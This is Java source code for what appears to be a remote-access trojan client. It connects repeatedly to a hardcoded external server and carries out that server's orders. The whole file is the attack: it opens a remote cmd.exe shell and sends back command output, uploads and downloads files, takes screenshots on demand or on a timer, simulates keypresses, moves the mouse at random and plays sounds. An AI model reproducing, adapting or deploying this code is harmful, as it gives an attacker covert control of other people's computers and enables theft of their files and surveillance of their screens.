package clientTest;


import java.awt.AWTException;
import java.awt.Dimension;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.Socket;
import java.nio.CharBuffer;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Random;

import javax.imageio.ImageIO;
import javax.sound.sampled.AudioInputStream;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.Clip;

public class Client {
	
	// Server data
	static String ip = "89.40.116.15";
	static int port = 6655;
	
	// ms to wait between requests to server
	static int connectTimer = 5000;
	
	// Connection variables
	static Socket client;
	static OutputStream outToServer;
	static InputStream inFromServer;
	static DataOutputStream out;
	static DataInputStream in;
	
	// cmd process
	static Process cmd;
	
	// autoScreenshot Thread
	static Thread aSS;
	static boolean aSS_active = false;
	
	// mouseMove Thread
	static Thread mM;
	static boolean mM_active = false;

	public static void main(String[] args) {
		
		// Connect to server
		connectToServer();
		
		// Start cmd process
		startCmd();
		
		// Wait for command from server
		System.out.println("Waiting for command...");
		String command;
		
		while (true) {
			try {
				command = in.readUTF();
				System.out.println("Recieved: " + command);
			} catch (Exception e) {
				connectToServer();
				continue;
			}
			
			switch (command) {
			case "cmd":
				cmdCommand();
				break;
			case "receive":
				receiveFile();
				break;
			case "send":
				sendFile();
				break;
			case "screenshot":
				screenshot();
				break;
			case "sound":
				sound();
				break;
			case "autoscreenshot":
				autoScreenshot();
				break;
			case "movemouse":
				moveMouse();
				break;
			case "presskey":
				pressKey();
				break;
			case "exit":
				safeExit();
				break;
			}
		}
	}
	
	// Simulates keyPress with received keyCode
	private static void pressKey() {
		int keyCode;
		
		try {
			keyCode = in.readInt();
		} catch (Exception e) {
			connectToServer();
			return;
		}
		
		try {
			Robot keyPresser = new Robot();
			keyPresser.keyPress(keyCode);
			keyPresser.keyRelease(keyCode);
		} catch (Exception e) {
			return;
		}
	}

	// Moves mouse to random position once or continuously
	private static void moveMouse() {
		
		// Read timer
		int timer, timerTemp;
		try {
			timerTemp = in.readInt();
		} catch (Exception e) {
			connectToServer();
			return;
		}
		
		// Deactivate mouseMove
		if (timerTemp == 0) {
			mM_active = false;
			return;
		}
		
		// Check if already running
		if (mM_active) return;
		
		// Check for dangerous timer
		if (timerTemp < 1000 && timerTemp != 1) return;
		
		timer = timerTemp;
		mM_active = true;
		
		// Create thread to move mouse
		mM = new Thread("MouseMove") {
			public void run() {
				
				Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
				int maxX = (int) screenSize.getWidth();
				int maxY = (int) screenSize.getHeight();
				
				Random random = new Random();
				Robot mouseRobot;
				try {
					mouseRobot = new Robot();
				} catch (AWTException e1) {
					e1.printStackTrace();
					mM_active = false;
					return;
				}
				
				while(mM_active) {
					if (timer == 1) mM_active = false;
					mouseRobot.mouseMove(random.nextInt(maxX), random.nextInt(maxY));
					try {
						Thread.sleep(timer);
					} catch (InterruptedException e) {
						e.printStackTrace();
						mM_active = false;
						return;
					}	
					System.out.println("...Mooved Mouse...");
				}
			}
		};
		mM.start();
		
	}


	// start cmd session
	private static void startCmd() {
		try {
			cmd = new ProcessBuilder("cmd.exe").redirectErrorStream(true).start();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	
	// Start/stop taking screenshots in given interval
	private static void autoScreenshot() {
		
		// Read timer
		int timer, timerTemp;
		try {
			timerTemp = in.readInt();
		} catch (Exception e) {
			connectToServer();
			return;
		}
		
		// Deactivate autoScreenshot
		if (timerTemp == 0) {
			aSS_active = false;
			return;
		}
		
		// Check if already running or for dangerous timer
		if (aSS_active || timerTemp < 1000) return;
		
		timer = timerTemp;
		aSS_active = true;
		
		// Create thread to take screenshots
		aSS = new Thread("AutoScreenshot") {
			public void run() {
				while(aSS_active) {
					screenshot();
					try {
						Thread.sleep(timer);
					} catch (InterruptedException e) {
						e.printStackTrace();
						aSS_active = false;
						return;
					}	
					System.out.println("...Took screenshot...");
				}
			}
		};
		aSS.start();
	}
	
	
	// Play .wmv 
	private static void sound() {
		
		// Receive path to .wav
		String path;
		try {
			path = in.readUTF();
		} catch (Exception e) {
			connectToServer();
			return;
		}
		
		// Open and play sound
		File soundFile = new File(path);
		Clip clip;
		try {
			clip = AudioSystem.getClip();
			AudioInputStream ais = AudioSystem.getAudioInputStream(soundFile);
			clip.open(ais);
			clip.start();
		} catch (Exception e) {
			e.printStackTrace();
		}	
	}

	
	// Save a screenshot as "dd_hh_mm_ss"
	private static void screenshot() {
		
		// Save current DateTime
		Date date = new Date();
		
		// Create format
		SimpleDateFormat ft = new SimpleDateFormat ("dd'_'hh'_'mm'_'ss");
		
		// Take screenshot and save with formatted DateTime as filename
		try {
			BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
			ImageIO.write(image, "png", new File(ft.format(date)));
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	
	// Upload file to server
	private static void sendFile() {
		
		// Recieve path
		String fPath;
		try {
			fPath = in.readUTF();
		} catch (Exception e1) {
			connectToServer();
			return;
		}
		
		
		// Prepare file for reading
		File file;
		FileInputStream fis;
		int fileLen = 0;

		try {
			file = new File(fPath);
			fis = new FileInputStream(file);
			fileLen = (int) file.length();
		} catch (Exception e) {
			e.printStackTrace();
			return;
		}
		
		// Read and send file
		byte[] buffer = new byte[fileLen];

		try {
			out.writeInt(fileLen);
			while (fis.read(buffer) > 0)
				out.write(buffer);
			fis.close();
		} catch (Exception e) {
			e.printStackTrace();
			connectToServer();
			return;
		}
	}

	
	// Download file from server, save as <fileLen>
	private static void receiveFile() {
		
		// Receive fileLen
		int fileLen = 0;
		try {
			fileLen = in.readInt();
		} catch (Exception e) {
			connectToServer();
			return;
		}
		
		// Prepare writing to file
		FileOutputStream fos;
		
		try {
			fos = new FileOutputStream(String.valueOf(fileLen));
		} catch (Exception e) {
			e.printStackTrace();
			return;
		}
		
		// Receive and save file
		int read = 0, remaining = fileLen;
		byte[] buffer = new byte[4096];
		
		try {
			while((read = in.read(buffer, 0, Math.min(buffer.length, remaining))) > 0) {
				remaining -= read;
				fos.write(buffer, 0, read);
			}
			fos.close();
		} catch (Exception e) {
			connectToServer();
			e.printStackTrace();
			return;
		}
		
		System.out.println("File recieved!");
	}
	
	
	// Execute cmd commands
	private static void cmdCommand() {	
		
		// Receive cmd command
		String command;
		
		try {
			command = in.readUTF();
		} catch (Exception e) {
			connectToServer();
			return;
		}
		
		System.out.println("Command " + command + " recieved");
		
		// Execute cmd command
		BufferedWriter cmdIn = new BufferedWriter(new OutputStreamWriter(cmd.getOutputStream()));
		try {
			cmdIn.write(command);
			cmdIn.newLine();
			cmdIn.flush();
		} catch (Exception e) {
			e.printStackTrace();
			return;
		}
		
		System.out.println("Command executed");
		
		// Read cmd output
		String cmdOutput = "";
		CharBuffer cb = CharBuffer.allocate(10000);
		BufferedReader cmdStream = new BufferedReader(new InputStreamReader(cmd.getInputStream()));
		
		try {
			Thread.sleep(200);
			boolean read = true;
			while (read) {				
				if ( cmdStream.ready()) {					
					if (cmdStream.read(cb) < 10000) read = false; 					
					cb.flip();				
					cmdOutput += cb.toString();
					if (cb.toString() == null) break;
				} else break;
			}
		} catch (Exception e) {
			e.printStackTrace();
			return;
		}
		
		System.out.println("Output read");
		
		// Send cmd output
		try {
			out.writeUTF(cmdOutput);
		} catch (Exception e) {
			connectToServer();
			return;
		}
	}

	
	// Connect to server
	private static void connectToServer() {
		
		// Close connection before reconnecting
		if (client != null)
			try {
				client.close();
			} catch (IOException e1) {}
		
		// Try connecting until connected
		boolean connected = false;
		
		while (!connected) {
			try {
				Thread.sleep(connectTimer);
				System.out.println("Connecting to Server...");
				client = new Socket(ip, port);
				outToServer = client.getOutputStream();
				inFromServer = client.getInputStream();
				out = new DataOutputStream(outToServer);
				in = new DataInputStream(inFromServer);
				connected = true;
			} catch (Exception e) {
				connected = false;
				System.out.println("Connection failed...");
			}
		}
		System.out.println("Connected!");
	}
	
	
	// Disconnect before exiting program
	private static void safeExit() {
		try {
			client.close();
			outToServer.close();
			inFromServer.close();
			out.close();
			in.close();
		} catch (IOException e) {}
		
		System.exit(0);
	}
}
